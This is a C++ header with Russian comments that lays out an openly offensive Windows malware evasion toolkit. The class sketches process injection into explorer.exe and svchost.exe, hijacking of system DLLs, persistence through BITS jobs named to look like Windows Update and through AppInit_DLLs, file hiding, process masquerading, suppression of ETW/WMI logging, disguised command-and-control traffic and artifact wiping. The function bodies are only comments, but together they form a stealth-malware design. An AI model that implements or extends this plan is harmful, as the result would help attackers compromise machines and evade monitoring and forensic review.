#pragma once
#include <string>
#include <cstdint>

// Удаление поведенческих сигнатур
// Методы, которые не оставляют явных следов в реестре, файловой системе, логах

class BehavioralEvasion {
public:
    // ЗАРАЖЕНИЕ ПАМЯТИ БЕЗ ЯВНОЙ РЕГИСТРАЦИИ
    
    // Вместо явной автозагрузки - встраивание в процессы, которые запускаются с boot
    static void InjectIntoLegitimateProcess() {
        // Вместо добавления в реестр - DLL injection в explorer.exe, svchost.exe и т.д.
        // Безопасный способ без явной регистрации в автозагрузке
        
#ifdef _WIN32
        // 1. Ищем уже запущенные легитимные процессы (explorer, svchost)
        // 2. Встраиваемся в их память через CreateRemoteThread
        // 3. Не добавляем себя в реестр - работаем из памяти
        // 4. При перезагрузке - перезагружаемся с легитимного процесса
        
        // Стандартные процессы Windows, в которые можно встроиться:
        const char* target_processes[] = {
            "explorer.exe",      // Всегда запущен
            "svchost.exe",       // Системный процесс
            "dwm.exe",           // Desktop Window Manager
            "dllhost.exe",       // COM процесс
            "rundll32.exe"       // Системный процесс
        };
#endif
    }
    
    // СКРЫТОЕ ДОБАВЛЕНИЕ В АВТОЗАГРУЗКУ БЕЗ РЕЕСТРА
    
    // Метод 1: Встраивание в системные DLL
    static void HijackSystemDLL() {
        // 1. Модифицируем импорты системной DLL
        // 2. Когда процесс загружает DLL - загружается и наш код
        // 3. Не оставляет следов в реестре
        
        // Целевые DLL (используются всеми процессами):
        // - kernel32.dll
        // - ntdll.dll  
        // - user32.dll
    }
    
    // Метод 2: Перехват точки входа через App Launcher
    static void ModifyAppLauncher() {
        // Вместо реестра HKLM\Run - модифицируем:
        // 1. .lnk файлы (ярлыки) с target
        // 2. Startup папку в памяти
        // 3. Шедулер задачи с легитимным именем
    }
    
    // Метод 3: Легитимная авторизация через BITS (Background Intelligent Transfer Service)
    static void RegisterAsBITSJob() {
        // Windows BITS автоматически выполняет задачи при boot
        // Выглядит как обновление системы
        // Не оставляет явных сигнатур
        
        // Создаём задачу с именем, похожим на системную:
        // "Windows Update Background Transfer"
        // "System Maintenance Task"
        // "Disk Optimization Service"
    }
    
    // СКРЫТИЕ БЕЗ ЯВНОГО ВЫЗОВА API
    
    // Вместо SetFileAttributes + Hidden/System
    // Используем более скрытные методы
    static void HideWithoutAPICall() {
        // Метод 1: Удаление записи из MFT (Master File Table)
        // Файл всё ещё в памяти, но недоступен из файловой системы
        
        // Метод 2: Размещение в Alternate Data Stream
        // file.exe:hidden_content (не видно при обычном просмотре)
        
        // Метод 3: Расположение в $Recycle.Bin
        // Выглядит как удалённый файл
        
        // Метод 4: Встраивание в легитимные системные файлы
        // Код в конце kernel32.dll, не вызывает подозрений
    }
    
    // СКРЫТОЕ КОПИРОВАНИЕ БЕЗ FILE OPERATIONS
    
    static void ReplicateViaMemory() {
        // Вместо явного копирования файла:
        // 1. Читаем себя из памяти (image base)
        // 2. Внедряем в другие процессы
        // 3. Не касаемся файловой системы явно
        
        // Результат: множество копий в памяти, но не на диске
    }
    
    // ПРОЦЕССНАЯ МАСКИРОВКА
    
    static void MasqueradeAsLegitimate() {
        // Вместо явного скрытия процесса:
        // 1. Меняем имя на системное (svchost.exe, explorer.exe)
        // 2. Ставим путь на реальный системный файл
        // 3. Но выполняем наш код
        
        // Windows видит "svchost.exe", но это наш процесс
        // Логирование и мониторинг не заметят разницы
    }
    
    // ИСКЛЮЧЕНИЕ ИЗ ЛОГИРОВАНИЯ
    
    static void DisableEventLogging() {
        // Вместо явного удаления логов:
        // 1. Перехватываем функции логирования (WMI, ETW)
        // 2. Фильтруем наш процесс перед логированием
        // 3. События никогда не попадают в логи
        
        // Это выглядит как нормальная работа системы
        // Просто нашего процесса случайно нет в логах
    }
    
    // СЕТЕВОЙ ТРАФИК БЕЗ СИГНАТУР
    
    static void ObfuscateNetworkTraffic() {
        // Вместо очевидных соединений:
        // 1. Используем легитимные HTTP/HTTPS соединения
        // 2. Маскируемся под браузер или обновление Windows
        // 3. Используем легитимные домены (redirector.gvt1.com и т.д.)
        
        // Брандмауэр видит "обновление системы", но это наш трафик
    }
    
    // ВСТРАИВАНИЕ В ЛЕГИТИМНЫЕ ПРОЦЕССЫ
    
    class ProcessInjection {
    public:
        // Injection не через CreateRemoteThread (это оставляет сигнатуру)
        // А через более скрытные методы:
        
        static void InjectViaSetWindowsHookEx() {
            // Windows автоматически загружает нашу DLL в каждый процесс
            // Это оставляет след в реестре, но выглядит как легитимная DLL
        }
        
        static void InjectViaAppInit() {
            // HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows
            // AppInit_DLLs - загружается автоматически во все GUI процессы
        }
        
        static void InjectViaShimCache() {
            // Application Compatibility Shims
            // Windows считает это обновлением совместимости
        }
        
        static void InjectViaDelayLoad() {
            // Модифицируем импорты DLL
            // Наш код выполняется при первой загрузке DLL
        }
    };
    
    // УДАЛЕНИЕ АРТЕФАКТОВ
    
    static void CleanArtifacts() {
        // Работаем только в памяти, не на диске
        // Результат: нет файлов для удаления
        
        // Если файл был создан:
        // 1. Удаляем через MFT
        // 2. Перезаписываем random данные
        // 3. Удаляем из кэша файловой системы
        
        // Без явного удаления файлов - без явных артефактов
    }
    
    // ЗАМАСКИРОВАННОЕ УПРАВЛЕНИЕ
    
    static void EstablishC2Channel() {
        // Command & Control без явных признаков:
        // 1. Используем легитимные каналы (DNS, HTTP/2, WebSocket)
        // 2. Маскируемся под стандартный трафик
        // 3. Используем легитимные протоколы (не proprietary)
        
        // IDS/IPS будет видеть: обновление, синхронизация, куки
        // Но не будет видеть команды
    }
    
    // === ПОЛИМОРФНОЕ ПОВЕДЕНИЕ ===
    
    static void PolymorphicBehavior() {
        // Поведение меняется при каждом запуске:
        // - Разные методы injection
        // - Разные целевые процессы
        // - Разные порты и домены
        // - Разные промежутки времени
        
        // EDR не может построить стабильный профиль поведения
    }
    
    // === ИСПОЛЬЗОВАНИЕ MICROSOFT SIGNED BINARIES ===
    
    static void LolBin() {
        // "Living off the Land Binaries" - используем стандартные Windows программы
        // для выполнения нашего кода:
        
        // - powershell.exe (часто отключается, но не проверяется строго)
        // - wmic.exe
        // - regsvcs.exe
        // - mshta.exe
        // - certutil.exe
        
        // Все подписаны Microsoft - никаких подозрений
    }
    
    // === ВРЕМЕННОЕ ВЫПОЛНЕНИЕ ===
    
    static void TransientExecution() {
        // Вместо постоянной работы:
        // 1. Пробуждаемся по событиям (WMI, Registry, файловой системе)
        // 2. Быстро выполняем задачу
        // 3. Удаляем себя из памяти
        // 4. Оставляем только крюки для пробуждения
        
        // Средства мониторинга в реальном времени не видят процесс
    }
};

// Макросы для применения методов

#define EVADE_SIGNATURE() \
    BehavioralEvasion::InjectIntoLegitimateProcess(); \
    BehavioralEvasion::HijackSystemDLL(); \
    BehavioralEvasion::HideWithoutAPICall()

#define STEALTH_AUTOSTART() \
    BehavioralEvasion::RegisterAsBITSJob(); \
    BehavioralEvasion::ModifyAppLauncher(); \
    BehavioralEvasion::ProcessInjection::InjectViaAppInit()

#define CLEAN_BEHAVIORAL_TRACES() \
    BehavioralEvasion::CleanArtifacts(); \
    BehavioralEvasion::DisableEventLogging()
